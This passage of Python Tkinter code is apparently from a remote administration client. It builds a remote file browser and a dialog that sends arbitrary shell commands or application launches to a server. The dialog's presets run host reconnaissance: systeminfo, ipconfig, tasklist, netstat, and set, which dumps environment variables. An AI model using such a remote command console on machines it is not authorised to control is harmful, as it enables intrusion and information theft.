        ttk.Label(path_frame, text="Path:").pack(side=tk.LEFT, padx=5)
        ttk.Entry(path_frame, textvariable=path_var, width=60).pack(
            side=tk.LEFT, padx=5, fill=tk.X, expand=True)

        # File list
        tree_frame = ttk.Frame(dialog)
        tree_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        tree = ttk.Treeview(tree_frame, 
                           columns=('Type', 'Size', 'Modified'),
                           show='tree headings')
        tree.heading('#0', text='Name')
        tree.heading('Type', text='Type')
        tree.heading('Size', text='Size')
        tree.heading('Modified', text='Modified')
        
        tree.column('#0', width=300)
        tree.column('Type', width=100)
        tree.column('Size', width=100)
        tree.column('Modified', width=150)
        
        tree.pack(fill=tk.BOTH, expand=True)

        scroll = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=tree.yview)
        scroll.pack(side=tk.RIGHT, fill=tk.Y)
        tree.config(yscrollcommand=scroll.set)

        def list_directory():
            tree.delete(*tree.get_children())
            result = self.api.list_directory(path_var.get())
            if result and result.get('success'):
                # Add parent directory
                if result.get('parent'):
                    tree.insert('', 0, text="..", values=('directory', '', ''))
                
                # Add items
                for item in result.get('items', []):
                    tree.insert('', tk.END,
                               text=item.get('name', ''),
                               values=(
                                   item.get('type', ''),
                                   item.get('size', ''),
                                   item.get('modified', '')
                               ))

        def on_double_click(event):
            selection = tree.selection()
            if selection:
                item = tree.item(selection[0])
                name = item['text']
                item_type = item['values'][0] if item['values'] else ''
                
                if item_type == 'directory':
                    if name == '..':
                        # Go to parent
                        import os
                        path_var.set(os.path.dirname(path_var.get()))
                    else:
                        # Go to subdirectory
                        import os
                        path_var.set(os.path.join(path_var.get(), name))
                    list_directory()

        tree.bind('<Double-Button-1>', on_double_click)

        # Controls
        controls = ttk.Frame(dialog)
        controls.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Button(controls, text="List", 
                  command=list_directory).pack(side=tk.LEFT, padx=5)
        ttk.Button(controls, text="Close", 
                  command=dialog.destroy).pack(side=tk.LEFT, padx=5)

        # Initial list
        list_directory()

    def show_command_dialog(self):
        """Show improved command execution dialog"""
        dialog = tk.Toplevel(self)
        dialog.title("Command Execution")
        dialog.geometry("800x600")
        dialog.transient(self.winfo_toplevel())

        # Command type selector
        type_frame = ttk.LabelFrame(dialog, text="Command Type")
        type_frame.pack(fill=tk.X, padx=10, pady=10)

        cmd_type = tk.StringVar(value="shell")
        ttk.Radiobutton(type_frame, text="Shell Command (CMD)", 
                    variable=cmd_type, value="shell").pack(side=tk.LEFT, padx=10, pady=5)
        ttk.Radiobutton(type_frame, text="Launch Application", 
                    variable=cmd_type, value="launch").pack(side=tk.LEFT, padx=10, pady=5)

        # Command input
        input_frame = ttk.LabelFrame(dialog, text="Command")
        input_frame.pack(fill=tk.X, padx=10, pady=5)

        ttk.Label(input_frame, text="Enter command or application path:").pack(
            padx=10, pady=5, anchor=tk.W)
        
        cmd_entry = ttk.Entry(input_frame, width=90)
        cmd_entry.pack(padx=10, pady=5, fill=tk.X)

        # Timeout setting
        timeout_frame = ttk.Frame(input_frame)
        timeout_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(timeout_frame, text="Timeout (seconds):").pack(side=tk.LEFT, padx=5)
        timeout_var = tk.StringVar(value="30")
        timeout_spin = ttk.Spinbox(timeout_frame, from_=1, to=300, 
                                textvariable=timeout_var, width=10)
        timeout_spin.pack(side=tk.LEFT, padx=5)

        # Quick commands
        quick_frame = ttk.LabelFrame(dialog, text="Quick Commands")
        quick_frame.pack(fill=tk.X, padx=10, pady=5)

        def insert_quick_cmd(command):
            cmd_entry.delete(0, tk.END)
            cmd_entry.insert(0, command)
            cmd_type.set("shell")

        quick_cmds = [
            ("System Info", "systeminfo"),
            ("IP Config", "ipconfig /all"),
            ("Tasklist", "tasklist"),
            ("Dir C:\\", "dir C:\\"),
            ("Network Stats", "netstat -an"),
            ("Ping Google", "ping google.com -n 4"),
            ("Current Time", "echo %date% %time%"),
            ("Environment", "set")
        ]

        for idx, (label, cmd) in enumerate(quick_cmds):
            ttk.Button(quick_frame, text=label, width=15,
                    command=lambda c=cmd: insert_quick_cmd(c)).grid(
                row=idx//4, column=idx%4, padx=5, pady=5)

        # Output area
        output_frame = ttk.LabelFrame(dialog, text="Output")
        output_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        output_text = tk.Text(output_frame, wrap=tk.WORD, font=('Consolas', 9))
        output_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        output_scroll = ttk.Scrollbar(output_frame, command=output_text.yview)
        output_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        output_text.config(yscrollcommand=output_scroll.set)

        # Status bar
        status_var = tk.StringVar(value="Ready")
        status_bar = ttk.Label(dialog, textvariable=status_var, 
                            relief=tk.SUNKEN, anchor=tk.W)
        status_bar.pack(fill=tk.X, side=tk.BOTTOM, padx=10, pady=5)

        def run_command():
            cmd = cmd_entry.get().strip()
            if not cmd:
                messagebox.showwarning("Warning", "Enter a command")
                return
            
            output_text.delete(1.0, tk.END)
            output_text.insert(tk.END, f"Executing: {cmd}\n")
            output_text.insert(tk.END, "="*80 + "\n\n")
            status_var.set("Executing...")
            dialog.update()
            
            try:
                timeout = int(timeout_var.get())
            except:
                timeout = 30
            
            if cmd_type.get() == "shell":
                result = self.api.execute_shell_command(cmd, timeout=timeout)
            else:
                result = self.api.launch_application(cmd)
            
            if result:
                if result.get('status') == 'success':
                    status_var.set("✓ Command executed successfully")
                    
                    if 'exit_code' in result:
                        output_text.insert(tk.END, f"Exit Code: {result['exit_code']}\n\n")
                    
                    if result.get('stdout'):
                        output_text.insert(tk.END, "STDOUT:\n")
                        output_text.insert(tk.END, result['stdout'] + "\n\n")
                    
                    if result.get('stderr'):
                        output_text.insert(tk.END, "STDERR:\n")
                        output_text.insert(tk.END, result['stderr'] + "\n")
                    
                    if 'pid' in result:
                        output_text.insert(tk.END, f"\nProcess started with PID: {result['pid']}\n")
                    
                    if not result.get('stdout') and not result.get('stderr') and cmd_type.get() == "launch":
                        output_text.insert(tk.END, "Application launched successfully\n")
                else:
                    status_var.set("✗ Command failed")
                    error = result.get('error', 'Unknown error')
                    output_text.insert(tk.END, f"ERROR: {error}\n")
                    
                    if result.get('stdout'):
                        output_text.insert(tk.END, f"\nPartial STDOUT:\n{result['stdout']}\n")
                    if result.get('stderr'):
                        output_text.insert(tk.END, f"\nPartial STDERR:\n{result['stderr']}\n")
            else:
                status_var.set("✗ Connection failed")
                output_text.insert(tk.END, "ERROR: Failed to connect to server\n")

        def clear_output():
            output_text.delete(1.0, tk.END)
            status_var.set("Ready")

        # Control buttons
        btn_frame = ttk.Frame(dialog)
        btn_frame.pack(fill=tk.X, padx=10, pady=5)

        ttk.Button(btn_frame, text="▶️ Execute", command=run_command,
                style='Accent.TButton').pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="🗑️ Clear Output", 
                command=clear_output).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="❌ Close", 
                command=dialog.destroy).pack(side=tk.RIGHT, padx=5)

        # Bind Enter key to execute
        cmd_entry.bind('<Return>', lambda e: run_command())
        cmd_entry.focus()